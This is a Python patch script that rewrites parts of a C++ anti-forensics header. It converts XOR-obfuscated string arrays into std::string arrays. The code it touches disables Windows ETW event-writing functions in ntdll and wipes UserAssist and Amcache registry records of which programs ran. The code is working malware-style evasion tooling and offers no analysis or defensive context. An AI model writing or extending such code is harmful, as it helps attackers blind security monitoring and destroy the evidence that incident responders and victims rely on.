import re

with open('anti_forensics.hpp', 'r', encoding='utf-8') as f:
    content = f.read()

# Fix const char* funcs[] in DisableEtwForProcess
content = content.replace(
'''    const char* funcs[] = {
        xorstr_("EtwEventWrite"),
        xorstr_("EtwEventWriteFull"),
        xorstr_("EtwEventWriteTransfer"),
        xorstr_("EtwEventWriteEx"),
        nullptr
    };''',
'''    const std::string funcs[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteTransfer",
        "EtwEventWriteEx",
        ""
    };'''
)
content = content.replace(
'''    for (int i = 0; funcs[i]; i++) {
        PVOID fn = (PVOID)GetProcAddress(hNtdll, funcs[i]);''',
'''    for (const auto& func : funcs) {
        if (func.empty()) continue;
        PVOID fn = (PVOID)GetProcAddress(hNtdll, func.c_str());'''
)

# Fix const char* UA_COUNTS[] in WipeUserAssist
content = content.replace(
'''    const char* UA_COUNTS[] = {
        xorstr_("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UserAssist\\\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\\\Count"),
        xorstr_("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UserAssist\\\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\\\Count"),
        nullptr
    };

    for (int ki = 0; UA_COUNTS[ki]; ki++) {
        HKEY hUA;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, UA_COUNTS[ki],''',
'''    const std::string UA_COUNTS[] = {
        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UserAssist\\\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\\\Count",
        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UserAssist\\\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\\\Count",
        ""
    };

    for (const auto& ua : UA_COUNTS) {
        if (ua.empty()) continue;
        HKEY hUA;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, ua.c_str(),'''
)

# Fix const char* AMCACHE_PATHS[] in WipeAmcache
content = content.replace(
'''        const char* AMCACHE_PATHS[] = {
            xorstr_("Root\\\\InventoryApplicationFile"),
            xorstr_("Root\\\\InventoryApplication"),
            xorstr_("Root\\\\InventoryDriverBinary"),
            nullptr
        };
        for (int i = 0; AMCACHE_PATHS[i]; i++)
            WipeSubkeysByPath(hTmp, AMCACHE_PATHS[i]);''',
'''        const std::string AMCACHE_PATHS[] = {
            "Root\\\\InventoryApplicationFile",
            "Root\\\\InventoryApplication",
            "Root\\\\InventoryDriverBinary",
            ""
        };
        for (const auto& ap : AMCACHE_PATHS) {
            if (ap.empty()) continue;
            WipeSubkeysByPath(hTmp, ap.c_str());
        }'''
)


with open('anti_forensics.hpp', 'w', encoding='utf-8') as f:
    f.write(content)
